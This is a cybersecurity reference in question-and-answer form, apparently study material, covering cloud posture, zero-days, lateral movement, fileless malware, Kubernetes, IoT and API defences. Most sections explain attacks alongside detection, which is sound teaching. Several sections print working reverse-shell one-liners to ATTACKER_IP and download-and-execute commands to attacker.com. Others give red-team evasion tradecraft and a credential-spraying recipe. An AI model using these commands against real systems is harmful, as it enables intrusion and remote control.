CSPM: continuous monitoring and assessment of cloud infrastructure configuration against security best practices and compliance standards; identifies and remediates misconfigurations. Problems solved: cloud environments highly dynamic (hundreds of resources created daily via IaC or console); manual configuration review impossible at scale; misconfigurations lead to breaches (Capital One via IAM misconfiguration + SSRF; Equifax via missing patch + no egress filtering; countless S3 public bucket exposures). Core capabilities: asset discovery and inventory: enumerate all cloud resources across accounts and regions; resource graph; visualise relationships between resources. Continuous compliance: CIS AWS Foundations Benchmark; NIST 800-53; PCI DSS; SOC 2; HIPAA; ISO 27001; GDPR; check resources against hundreds of controls continuously; alert on non-compliant resources; compliance dashboards for management reporting. Misconfiguration detection: S3 public access; security groups 0.0.0.0/0 for SSH/RDP; unencrypted EBS volumes; RDS without encryption; CloudTrail not enabled; root account with no MFA; IAM users with no MFA; VPC flow logs disabled; public EC2 snapshots; over-permissive IAM roles. Automated remediation: alert + auto-remediate misconfigs: enable encryption, add MFA requirement, remove 0.0.0.0/0 rules; manual approval workflow for higher-risk remediations. Multi-cloud: single pane across AWS, Azure, GCP; consistent policy enforcement; unified compliance reporting across clouds. Tools: Prisma Cloud (Palo Alto; most comprehensive; multi-cloud); Wiz (fast growth; agentless; graph-based risk); Orca Security (agentless; snapshot-based; deep visibility); Lacework (anomaly-based; time-series data analysis); Bridgecrew/Checkov (developer-friendly; IaC scanning in CI/CD; part of Prisma Cloud); Microsoft Defender for Cloud (Azure-native; multi-cloud; free tier for Azure resources); AWS Security Hub + Config (AWS-native; good starting point; free with AWS Config costs). Priority: risk-prioritise findings: critical misconfiguration on internet-facing asset with sensitive data = P1; low misconfiguration on internal dev resource = P4; blast radius analysis.
What is zero-day vulnerability and how do they work?

Zero-day vulnerability: security flaw unknown to the vendor and therefore unfixed; no patch available; discovered by: security researcher (who may disclose or sell to buyers), attacker (who uses silently), government intelligence agencies (who stockpile). Name origin: zero days since vendor became aware; vendor has had zero days to fix. Types: in-the-wild (ITW) zero-day: actively exploited before vendor awareness or patch; 0day for short in offensive community; very valuable. n-day: vulnerability with patch available but not yet applied by victim organisation; technically has a known CVE; attackers exploit between patch release and deployment. Discovery methods: manual code review (audit code for vulnerability patterns; most effective but slow); fuzzing (automated input testing; discover crashes indicating memory corruption); variant analysis (find similar bugs to known vulnerabilities in same codebase); reverse engineering (binary analysis of closed-source software); symbolic execution (mathematically model program to find inputs reaching dangerous code). Market: government buyers (NSA, GCHQ, CIA, Mossad, FSB, PLA, etc.) pay premium for reliable zero-days; brokers (Zerodium: iOS full-chain jailbreak $2.5M, Chrome 1-click $500K, Windows LPE $120K); exploit kit developers; criminal organisations; defenders never win auction against nation-states. Detection (without knowing vulnerability): behavioural detection (EDR detects exploit behaviour even without signature); memory corruption patterns; anomalous process behaviour; YARA hunting for shellcode patterns; honeypots as tripwires; threat intelligence from government (CISA advisories, FBI Flash Alerts); anomaly-based NIDS detecting novel attack patterns. Patch gap risk: 0day patches often released with inadequate detail hiding true impact; reverse diffing patch reveals vulnerability details; attackers reverse patch before organisations apply it; organisations have days to hours to patch critical 0days before mass exploitation. Coordinated Vulnerability Disclosure (CVD): researcher finds 0day; privately notifies vendor; vendor patches; researcher publishes after patch; ideal flow reducing exposure.
What is a watering hole attack?

Watering hole attack: attacker compromises website frequently visited by target audience; rather than directly attacking hard target; infect the watering hole and victims come to attacker. Named after predators waiting at watering holes for prey. How it works: identify target organisation or group (government department, defence contractor, critical infrastructure operator, financial institution, industry executives); profile where targets go online (industry news sites, technical forums, conference websites, government supplier portals, professional association websites); compromise those websites (web application vulnerabilities: SQLi, XSS, admin credential stuffing; hosting provider compromise; third-party JavaScript supply chain); inject malicious code (exploit kit, drive-by download, malicious JavaScript that fingerprints and selectively exploits only targets from specific IP ranges or browser configurations); when target visits: exploit browser or plugin vulnerability; install malware silently. Why effective: bypasses email security (no phishing email); bypasses network controls (target browses to website themselves; traffic looks legitimate); compromised site is trusted by target; highly selective (only exploit certain visitor profiles -- reduces detection); attribution harder (intermediary site obscures true attacker). Historical examples: Operation Aurora (2010 Google/Intel/Adobe hack): watering hole component; Operation Pawn Storm: targeted defence industry; Energetic Bear/Havex ICS attacks: targeted industrial control vendors websites; North Korean attacks on cryptocurrency community websites. Detection: endpoint: browser exploit detection; EDR alerts on suspicious browser child processes; suspicious PowerShell from browser. Network: alert on browser connecting to unknown/suspicious domains post-visit to known legitimate site; DNS queries to newly registered domains; traffic to uncategorised URLs from browser process. Website owners: monitor for unauthorised script additions; Content Security Policy reduces injected script impact; integrity checking of website assets; WAF to detect exploitation attempts; incident response plan for site compromise. Mitigation: keep browsers and plugins patched; browser isolation (Menlo Security, Zscaler Remote Browser Isolation); DNS filtering; no browser extensions unless necessary; sandboxed browsing for high-value employees.
What is living off the land in cybersecurity?

Living off the land (LotL): attackers use legitimate system tools and features already present on compromised host; avoids introducing new malware files (no new binaries = harder to detect); uses trusted executables that bypass whitelisting and AV. Windows LotL tools (LOLBins): PowerShell: download and execute code in memory; encoded commands; bypass execution policy; certutil.exe: decode base64 files; download files from URL (certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe); often not blocked; bitsadmin.exe: BITS file transfer service; download files in background; wmic.exe: execute processes remotely and locally; query system information; regsvr32.exe: register DLL (regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll -- squiblydoo: download and execute scriptlet without UAC); rundll32.exe: run DLL function (rundll32 javascript:... -- execute JavaScript); mshta.exe: execute HTML applications (.hta files with VBScript/JScript); can download remote HTA file; msiexec.exe: install MSI packages (download and install from URL: msiexec /q /i http://attacker.com/payload.msi); PsExec: legitimate Sysinternals tool commonly used by attackers; net.exe: user and group management; winrm.exe: Windows Remote Management client; scheduled tasks (schtasks.exe), service control (sc.exe), reg.exe: all native tools for persistence. Script-based: PowerShell, VBScript, JScript, Python (if installed), Perl, Ruby; macros in Office; script hosts (wscript.exe, cscript.exe). Linux LotL: curl, wget, nc (netcat), python3, perl, gcc (compile payload on target), ssh, openssl, bash: all native tools for download, reverse shells, persistence. Defense: Script block logging (PowerShell); process command line logging (Event 4688 with command line); Constrained Language Mode (PowerShell); application control (AppLocker, Windows Defender Application Control -- WDAC -- can restrict even LOLBins); AMSI; behavioural detection in EDR (certutil downloading from internet = suspicious regardless of benign certutil use).
How do you use Python for security automation?

Python for security automation: most popular language in cybersecurity; extensive libraries; rapid development; used for tooling, analysis, automation, exploit development. Key libraries: requests: HTTP client; web scraping; API interaction; with sessions for cookie handling; Scapy: packet crafting and manipulation; custom protocol implementation; network scanning; fuzzing; replaces tcpdump, nmap for custom tasks; Impacket: Windows protocols (SMB, MSRPC, Kerberos, NTLM, LDAP, MSSQL) as Python library; basis of many AD attack tools; paramiko: SSH client and server implementation; automate SSH commands; crypto primitives (hmac, hashlib, cryptography library): implement crypto functions, crack hashes, manipulate tokens; pwntools: CTF and exploit development; cyclic patterns, pack/unpack, remote connections, ROP chain; ldap3: LDAP queries against Active Directory; jwt: JWT token manipulation (decode, encode, algorithm confusion); beautifulsoup4: HTML parsing for web scraping; selenium: browser automation (CAPTCHA interaction, JavaScript-heavy sites). Automation examples: mass vulnerability scanner: iterate IP list with nmap-python, check for specific service, test with custom exploit, report results; credential spraying: given user list and password: spray against LDAP, OWA, or web login; implement lockout avoidance (1 attempt per user per hour); log analysis: parse large log files, extract patterns, count occurrences, correlate events; certificate monitoring: query crt.sh API for new certificates for your domain, alert on new entries; AWS security audit: boto3 (AWS Python SDK) to enumerate IAM users, roles, policies, check for MFA, check for unused credentials, generate report; exploit PoC: requests to send payloads, check responses for vulnerability indicators; SIEM enrichment: lookup IP in threat intel APIs (VirusTotal, Shodan), enrich SIEM alerts with context. Best practices: input validation (even in security tools); error handling (network timeouts, auth failures); logging all actions (audit trail for pentests); rate limiting (avoid DoS on targets); parameterised queries even in security scripts; virtual environments (isolate dependencies per project: python3 -m venv.venv).
What is the difference between hashing and encryption?

Hashing vs Encryption: fundamentally different operations with different use cases. Hashing: one-way function; takes arbitrary input, produces fixed-size digest; deterministic (same input always same output); cannot be reversed (no key, no decryption); collision-resistant (hard to find two inputs with same hash). Use cases: verify data integrity (checksum: SHA-256 of downloaded file matches published hash); password storage (store hash of password, not password itself; compare hash of entered password against stored hash); digital signatures (sign hash of document, not document itself); hash tables, deduplication. Password hashing: MUST use password-specific algorithms (bcrypt, argon2id, scrypt) not general cryptographic hashes (MD5, SHA-256 too fast = easy GPU cracking). Encryption: two-way operation; encrypt with key, decrypt with key; recoverable; symmetric (same key encrypts and decrypts: AES) or asymmetric (public key encrypts, private key decrypts: RSA/ECC). Use cases: protect data confidentiality; encrypt data at rest (disk encryption: BitLocker, FileVault, dm-crypt); encrypt data in transit (TLS, SSH, VPN); encrypt files or messages (PGP, S/MIME); key wrapping. When to use which: store user passwords: hash (argon2id) -- never encrypt (if encryption key compromised, all passwords revealed instantly); transmit sensitive data: encrypt (TLS); verify file not tampered: hash (SHA-256 checksum); prove identity (digital signature): sign hash with private key; protect stored credit card: encrypt (need to retrieve for processing -- cannot hash); protect stored API tokens: hash (only verify when presented, never display again) or encrypt (if need to display masked). Common mistake: encrypting passwords instead of hashing (encryption implies reversibility = if key stolen, all passwords exposed; hashing without reversibility = breach of hashes does not immediately expose passwords); another mistake: using MD5 or SHA-256 for password hashing (too fast, GPU cracks millions per second; use bcrypt/argon2id).
How do you perform a network perimeter assessment?

Network perimeter assessment: systematically test externally accessible infrastructure for vulnerabilities and attack surface. Scope: define IP ranges and domains in scope; CIDR notation for IP ranges; all external IP addresses of organisation; all internet-facing applications; cloud infrastructure; third-party services. Reconnaissance: passive: Shodan search for organisation IP ranges or ASN: Shodan.io org:CompanyName (find all internet-exposed services); Censys (similar, different data); RIPE/ARIN for ASN and IP range ownership; crt.sh for subdomains via certificate transparency; Google dorks (site:company.com inurl:admin); SecurityTrails for DNS history; LinkedIn/job postings for technology hints. Active: DNS enumeration: subfinder, amass (passive + active brute force with wordlists); dnsrecon; MX records (mail server); SPF/DKIM/DMARC records (email security assessment); port scanning: nmap -sV -p- target_ip (all ports, version detection); nmap --script vuln (vulnerability scripts); masscan for speed on large ranges (1M pps; use carefully); output format: -oA for all formats; map all services: web (80/443/8080/8443); SSH (22); RDP (3389/2179); FTP (21); SMTP/IMAP/POP (25/143/587/993/995/465); database ports (1433/3306/5432/1521); VPN (443/1194/4500). Service testing: web applications: directory enumeration (gobuster, feroxbuster), technology fingerprinting (whatweb, wappalyzer), SSL/TLS configuration (testssl.sh, ssllabs.com API); SSH: version banner (does version have known CVEs?), check for weak algorithms (ssh -o HostKeyAlgorithms, Ciphers, MACs negotiation); SMTP: open relay test (send email from external to external through server); test for NTLM authentication endpoint exposure (Exchange autodiscover, OWA, EWS); VPN: check for known CVEs in VPN product version; Citrix, Pulse, GlobalProtect, Cisco ASA -- all had critical CVEs 2019-2024. Reporting: create attack surface inventory; prioritise internet-exposed services by criticality; exploit findings to demonstrate impact; executive summary of external exposure level compared to peers.
What is a reverse shell and how do you set one up?

Reverse shell: connection initiated FROM victim TO attacker; bypasses most firewalls (outbound connections usually permitted); attacker listens for incoming connection. Why reverse vs bind shell: bind shell: attacker connects to victim (victim listens); blocked by victim firewall or NAT (incoming connections blocked); reverse shell: victim connects to attacker; allowed by most firewalls (outbound HTTP/HTTPS/DNS); NAT-traversing (victim behind NAT connects out; attacker on internet receives). Setup: Attacker listener: netcat: nc -lvnp 4444 (listen on port 4444); metasploit: use multi/handler, set PAYLOAD, set LHOST/LPORT, run; pwncat (python3 -m pwncat -lp 4444 -- upgrades shell with PTY, logging). Victim payload: Bash: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; or: exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done; Python3: python3 -c import socket,subprocess,os;s=socket.socket();s.connect((ATTACKER_IP,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([/bin/bash,-i]); PowerShell: powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient(ATTACKER_IP,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);...}; Netcat: nc ATTACKER_IP 4444 -e /bin/bash (if nc supports -e); rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f (without -e). Shell upgrade (get full TTY): python3 -c import pty;pty.spawn(/bin/bash); CTRL-Z; stty raw -echo; fg; export TERM=xterm; stty rows 40 cols 200; OR use pwncat-cs which handles automatically. Encrypted shells: ncat --ssl (SSL/TLS encrypted netcat); socat with openssl; avoid detection by network monitoring inspecting cleartext shells.
What are red team infrastructure considerations?

Red team infrastructure: attacker-simulating infrastructure for long-term engagements; designed for stealth, resilience, and operational security. Domain selection: aged domains (registered >1 year; established reputation; not on fresh domain blocklists); categorised domains (purchase domains already categorised by web filtering products as benign -- technology, business, news categories); check domain reputation before use: web categorisation check (Cisco Talos, BlueCoat, Symantec). Domain fronting: route C2 traffic through major CDN (Cloudflare, Fastly, Azure CDN); request uses CDN domain in SNI/Host but attacker domain in HTTP Host header; network sees legitimate CDN traffic; C2 destination hidden; increasingly detected and blocked by CDN providers (Cloudflare now blocks domain fronting). Redirectors: VPS servers sitting between victim and real C2 team server; victim connects to redirector; redirector forwards to team server; team server IP never exposed to target network; htaccess-based redirectors: if User-Agent not matching expected (not victim), redirect to legitimate site (cloudflare.com); dumb pipe redirectors: socat or iptables forward all traffic. Categories of infrastructure: short-haul (phishing): domains and servers for phishing campaigns; disposable; exposed frequently; long-haul (persistent C2): more protected; less-frequently changing; harder to attribute; operational security (OPSEC) separation: never use same infrastructure for initial access and post-exploitation; burn compromised infrastructure and rebuild. Traffic blending: HTTP/HTTPS on port 443 (most firewall-permissive); C2 traffic mimics legitimate application traffic (Cobalt Strike malleable profiles mimic Office 365, Google, Akamai); Jitter (sleep randomisation: beacon interval +/- random%); low-and-slow (long sleep intervals; blend with legitimate background traffic). Operational security: separate VPS for each infrastructure component; pay with cryptocurrency or gift cards; no personally identifiable information in domain registration; VPN to access infrastructure; operational compartmentalisation (team server access logged; rotate SSH keys).
What is a cyber threat intelligence program?

CTI program: systematic collection, processing, analysis, and dissemination of threat intelligence tailored to organisation needs. Maturity levels: ad hoc: consume public feeds reactively; no systematic approach; basic: structured collection from multiple sources; threat intel team; indicators operationalised into controls; advanced: intelligence production (not just consumption); track specific threat actors; proactive intelligence-led security operations; strategic: threat intelligence informs business strategy and risk decisions. Collection requirements (intelligence requirements): what threats are relevant to us? (industry sector, geography, technology, threat actors); define Priority Intelligence Requirements (PIRs): what specific questions do we need answered?; collection plan maps PIRs to sources. Sources: OSINT: VirusTotal, Shodan, CIRCL MISP community, Twitter/X security researchers, GitHub (threat actor tooling), dark web forums (monitored via commercial services), government advisories (CISA, NCSC, FBI); commercial: Recorded Future (comprehensive, AI-powered), Mandiant Threat Intelligence (government-grade APT tracking), CrowdStrike Intelligence (adversary-focused), Flashpoint (dark web, criminal forums, fraud). Processing: raw indicators (IPs, domains, hashes): ingest into MISP or TIP (Threat Intelligence Platform); STIX/TAXII for standardised sharing; MISP (Malware Information Sharing Platform): open source; share indicators with community; automated correlation. Analysis: indicator-of-compromise (tactical): immediate action (blocklist, SIEM rule); TTPs (operational): hunt for adversary techniques; strategic: brief executive on threat landscape, advise on security investment. Dissemination: different outputs for different audiences: SOC: tactical IoC feed; detection rules based on TTPs; executives: strategic threat briefings; IT teams: vulnerability bulletins for relevant software; board: annual threat landscape report. Metrics: intelligence requirements addressed (%); time from indicator discovery to operationalisation; threat actor coverage (how many relevant actors tracked?); detections attributed to CTI-derived rules.
What is lateral movement via WMI in Windows?

WMI lateral movement: Windows Management Instrumentation used for remote command execution; built-in Windows capability; present in all Windows versions since 98; commonly used for legitimate management but abused for lateral movement. Authentication: NTLM or Kerberos; requires admin credentials on target. Remote execution: wmic.exe (command line): wmic /node:TARGET /user:DOMAIN\admin /password:pass process call create cmd.exe /c whoami > C:\output.txt; InvokeWmiMethod (PowerShell): Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList cmd.exe /c whoami; Python (Impacket): wmiexec.py domain/admin:pass@TARGET cmd.exe. Mechanism: DCOM connection on port 135 (then dynamic port 1024-65535); Win32_Process.Create() starts new process on remote host; output not returned directly; write to file and read via SMB. Why preferred for lateral movement: no service installation (unlike PsExec); less noisy than PsExec; output appears on remote system (harder to correlate with attack traffic); runs as the authenticated user (or SYSTEM if running as SYSTEM). WMI persistence: WMI event subscriptions for persistent execution without files: EventFilter (trigger: on login, on file create, on timer); EventConsumer (action: execute command/script); FilterToConsumerBinding (links filter to consumer); survives reboots; hidden from standard service and scheduled task enumeration; Autoruns shows WMI subscriptions; PowerShell Get-WMIObject __EventFilter, __EventConsumer. Detection: Windows Event Logs: Event 4688 (process creation) on target with parent process WmiPrvSE.exe (WMI Provider Host -- parent of WMI-spawned processes); network events: DCOM traffic (135 + ephemeral ports) from unusual source to target; Microsoft-Windows-WMI-Activity/Operational event log: event IDs 5858, 5860, 5861 log WMI query activity; Event 19/20/21 in Sysmon for WMI subscription creation (persistence). Mitigation: restrict WMI remote access to admin-only hosts (Firewall rules); monitor WmiPrvSE.exe child processes; Sysmon WMI event logging; CrowdStrike and other EDRs detect WMI-based execution patterns.
What is file-less malware and how does it evade detection?

Fileless malware: malware that operates entirely in memory without writing malicious files to disk; evades file-based antivirus and forensics; uses legitimate system processes and scripting engines. Techniques: PowerShell in-memory execution: IEX (New-Object Net.WebClient).DownloadString(http://c2.attacker.com/payload.ps1) -- downloads and runs PowerShell directly in memory; no file on disk; WMI: Win32_Process.Create executes code; WMI subscriptions persist without files; Macro-based: Office document with malicious macro; macro runs PowerShell or VBScript; downloads payload to memory via IEX; Office document itself may be deleted after execution; Process injection: inject shellcode into running legitimate process (explorer.exe, svchost.exe); malicious code runs in trusted process; no executable on disk; Living off the land: use certutil, mshta, regsvr32, wmic to download and execute payload without writing malicious binary. Registry-based persistence: store Base64-encoded shellcode in registry key; scheduled task or run key runs PowerShell that reads registry and executes: powershell.exe -enc BASE64_COMMAND; encoded command decodes and executes registry blob; nothing written to disk except registry entry. Memory-only implants: Cobalt Strike reflective DLL injection: DLL loaded into memory without touching disk; Metasploit: migration into another process; payload entirely in memory. Evasion: no file = no file hash for signature-based AV to detect; no file = no file forensics artefacts; traditional forensics finds nothing on disk even after complete compromise. Detection: memory scanning: EDR scans process memory for shellcode patterns (YARA in memory); behavioural: PowerShell spawning unexpected child processes; base64-encoded PowerShell command lines (Event 4688 command line logging); Script Block Logging (Event 4104): logs PowerShell code even if encoded (decoded at execution time); AMSI: hooks into scripting engines (PowerShell, VBScript, JavaScript) and scans code before execution; even encoded code decoded before execution = AMSI sees plaintext; ETW (Event Tracing for Windows): detailed telemetry from scripting engines; Sysmon: process creation, network connections, process injection (Events 1, 3, 8, 10); Memory forensics: dump LSASS or full memory image; find injected code in memory even after process terminates.
What is DLP (Data Loss Prevention) and how is it implemented?

DLP (Data Loss Prevention): technology and process to prevent sensitive data from leaving organisation without authorisation; detects and blocks or alerts on sensitive data exfiltration. Data classification: must classify data before protecting it; typically: Public, Internal, Confidential, Restricted/Secret; manual classification (employees label documents) and automatic (ML/pattern matching to classify based on content). Types of DLP: Endpoint DLP: agent on endpoint device; monitors: clipboard (prevent copying classified data); USB/external storage (block or log copying sensitive files to USB); print (prevent printing classified documents); email client; upload to browser (block uploading sensitive files to personal cloud or web mail); CrowdStrike DLP, Symantec DLP, Forcepoint DLP, Microsoft Purview. Network DLP: inline inspection of network traffic; email gateway inspects outbound emails for PII, classified data; proxy inspects HTTP uploads; cannot inspect encrypted traffic without TLS interception (MITM proxy); common for email and HTTP channels; Cloud DLP: CASB (Cloud Access Security Broker): inspect traffic to cloud services (Microsoft 365, Google Workspace, Box, Dropbox, Salesforce); block upload of sensitive data to personal cloud services; Microsoft Purview for M365; DLP policies in Google Workspace admin. Data-at-rest DLP: scan file shares, SharePoint, email archives for misclassified data (classified document in public folder); remediate: move, quarantine, encrypt, or flag. Detection patterns: regex-based: SSN pattern (XXX-XX-XXXX), credit card numbers (Luhn check), passport numbers, IP addresses, email addresses, healthcare record numbers; ML-based: classify document type (financial report, medical record, source code) by content features; keyword lists: proprietary product names, executive names, M&A target company names; fingerprinting: fingerprint specific sensitive documents; detect partial matches or derivatives. Challenges: false positives disrupt legitimate business processes (block legitimate email containing customer data); encrypted channels bypass network DLP; personal devices not agent-covered; cloud sync clients bypass network DLP; employees find workarounds (print and photograph, personal phone photo of screen); effectiveness depends on data classification accuracy.
What is Kubernetes security?

Kubernetes security: multi-layered security for container orchestration platform; cluster, container, and workload levels. Control plane security: API server: the central control point; restrict access to API server (network policy: only admin IPs); enable RBAC (most critical K8s security control); enable audit logging (--audit-log-path, --audit-policy-file: log all API server activity); TLS for all control plane communications; etcd (stores all cluster state including secrets): restrict access to etcd (only API server should access etcd); encrypt etcd at rest (--encryption-provider-config: aesgcm or secretbox). RBAC: ClusterRole and ClusterRoleBinding; Role and RoleBinding (namespace-scoped); least privilege: pods should not have cluster-admin; service account tokens automatically mounted in pods -- restrict with automountServiceAccountToken: false; avoid default service account with broad permissions. Pod security: Pod Security Standards (Kubernetes 1.25+ replacing deprecated PodSecurityPolicy): Privileged (no restrictions), Baseline (prevents known privilege escalations), Restricted (best practice for hardened containers); enforce Restricted for production workloads. Dangerous pod specs to avoid: privileged: true (full node access); hostPID: true (share host PID namespace); hostNetwork: true (share host network); hostPath volume mounts (access host filesystem); runAsRoot without restriction; capabilities: add: [SYS_ADMIN, NET_ADMIN] (dangerous capabilities). Network policies: default: all pods can communicate with all pods in cluster; add NetworkPolicy: deny all ingress/egress; explicitly allow only required paths; namespace isolation; Calico, Cilium, Antrea network plugins support NetworkPolicy. Secrets management: Kubernetes secrets base64-encoded (not encrypted in etcd by default); encrypt etcd at rest; or use external secrets management (Vault with Vault Agent Sidecar Injector, AWS Secrets Manager with external-secrets-operator). Supply chain: only pull images from trusted registries; admission controllers (OPA Gatekeeper, Kyverno) enforce policies on all resource creation; image signing (Cosign + policy admission) ensures only signed images from trusted sources deployed. Runtime detection: Falco: CNCF open-source; eBPF-based; K8s audit log + syscall monitoring; alerts on: privilege escalation, sensitive file access, unexpected network connections, container escape attempts.
What is security testing for IoT devices?

IoT security testing: assessing security of internet-connected devices (cameras, routers, smart home devices, medical devices, industrial sensors). Common IoT vulnerabilities: Hardcoded credentials: factory-set username/password same across all devices of same model; credentials published in manual or online; Mirai botnet exploited telnet with default credentials (admin/admin, root/root, support/support list); many devices never changed. Unencrypted protocols: Telnet (23), HTTP (80), MQTT without TLS; network capture reveals credentials and commands; replace with SSH, HTTPS, TLS-MQTT. Insecure firmware: firmware update without signature verification; downgrade attacks; local firmware modification; firmware extraction for analysis. Exposed debug interfaces: UART (serial debug port on PCB): requires physical access; press reset, interrupt boot, gain root shell; JTAG (debug interface): read/write memory and CPU registers; full firmware extraction; hardware hacking tools: Bus Pirate, JTAGulator, Segger J-Link. Cloud backend vulnerabilities: weak authentication on API; IDOR (access other users devices by ID); insecure account recovery; mass account takeover via credential stuffing. Testing methodology: reconnaissance: identify device; find manufacturer; search for CVEs, public firmware, online admin manuals; FCC filings (FCC ID lookup shows device internals and RF certification data). Network analysis: capture all network traffic (nmap scan, Wireshark); identify protocols; test for unencrypted or unauthenticated protocols. Web interface: test admin web interface (Burp Suite; SQLi, XSS, command injection, default credentials, CSRF). Firmware analysis: obtain firmware from update URL, manufacturer site, or extract via hardware (SPI flash dump); binwalk (extract firmware components: binwalk -e firmware.bin); file system extraction; strings analysis; Ghidra or IDA Pro for binary analysis; find hardcoded credentials, private keys, sensitive URLs. Mobile app: companion app for device control; test mobile app (Frida, Burp); API security. Tools: Nmap, Wireshark, Binwalk, FACT (Firmware Analysis and Comparison Tool), Routersploit (exploitation framework for embedded devices), Shodan (find internet-exposed IoT devices), OWASP IoT Attack Surface Areas.
What are advanced persistent threat (APT) groups and how do they operate?

APT (Advanced Persistent Threat): sophisticated, long-term, targeted cyber attacks typically conducted by nation-states or state-sponsored groups; characterised by advanced capabilities, persistence, and specific intelligence objectives. Characteristics: Advanced: use zero-days and custom malware; sophisticated evasion; operational security; state-level resources; Persistent: maintain access for months or years; patient; achieve strategic objectives over time; Threat: real, specific threat to targets; intelligence-gathering, IP theft, espionage, sabotage. Major APT groups: APT29 (Cozy Bear/Midnight Blizzard -- Russia, SVR): SolarWinds Orion supply chain (SUNBURST); sophisticated tradecraft; rarely destructive; intelligence focus; healthcare, government, think tanks. APT28 (Fancy Bear/Forest Blizzard -- Russia, GRU): DNC hack 2016; Olympic doping agency hack; military targets; more aggressive and destructive than APT29. Lazarus (North Korea, RGB): financial motivation (cryptocurrency theft; SWIFT attacks); WannaCry ransomware; Sony Pictures hack. APT41 (Double Dragon -- China, MSS): dual financial and espionage motivation; aggressive supply chain attacks; healthcare, gaming, technology IP theft. APT40 (Bronze Mohawk -- China, MSS): maritime, aerospace, engineering research theft; Pacific Rim focus. Sandworm (Russia, GRU): most destructive; BlackEnergy Ukraine power grid attacks 2015/2016; NotPetya 2017; VPNFilter router malware; Olympic Destroyer. Operation techniques: initial access: spearphishing (highly targeted, researched emails to specific individuals), zero-day exploitation, supply chain compromise, trusted relationship abuse; C2 evasion: custom implants (no Metasploit or Cobalt Strike default profiles), domain fronting, C2 via legitimate services (Twitter, Google Docs, Pastebin used as C2 channels), steganography, encrypted custom protocols; persistence: kernel rootkits, UEFI bootkits (survive OS reinstall), firmware implants (unreachable without hardware flash); intelligence: collect email, documents, credentials, network maps; exfiltrate slowly over extended period. Detection: look for long-duration connections; unusual system access patterns; anomalous data transfers; threat intelligence on known APT IoCs; government sharing (CISA, FBI advisories name specific IoCs for active APT campaigns).
How do you secure APIs using rate limiting and throttling?

API rate limiting and throttling: controls to prevent abuse, brute force, and DoS against APIs. Why needed: without rate limiting: brute force login (unlimited password attempts); credential stuffing at scale; scraping entire database via API; DDoS via expensive queries; billing fraud via excessive usage. Types: Rate limiting: restrict number of requests per time window (100 requests per minute per API key; 5 failed login attempts per 15 minutes); request count-based; fixed window or sliding window algorithm. Throttling: slow down requests rather than hard-block; return HTTP 429 with Retry-After header; client can retry; better for API consumers than hard block. Quota: total usage limit (1,000 API calls per day total; 100GB data transfer per month); different from rate limit (which is per-time-window); billing model for commercial APIs. Algorithms: Fixed window counter: reset counter at window boundary; simple; burst possible just before reset; Sliding window log: log timestamp of each request; count requests in last N seconds; most accurate; memory-intensive; Sliding window counter: hybrid approach; approximate sliding window using fixed window + fraction of previous window; Token bucket: tokens added at fixed rate; each request consumes token; burst allowed up to bucket size; smooth rate limiting; Leaky bucket: requests drip out at fixed rate regardless of burst; smooths traffic. Implementation: API gateway level (Kong, AWS API Gateway, Azure API Management): centrally enforce rate limits; per-API-key, per-user, per-IP; Redis for distributed rate limiting state (multiple gateway instances share counter). Headers: HTTP 429 Too Many Requests response; Retry-After: 60 (seconds until retry); X-RateLimit-Limit: 100, X-RateLimit-Remaining: 23, X-RateLimit-Reset: 1703168400 (epoch timestamp of window reset). Security-specific limits: authentication endpoints: 5 attempts per 15 minutes (anti-brute-force); password reset: 3 per hour per account; OTP codes: 5 attempts then lockout; account creation: 10 per IP per hour (anti-automation).
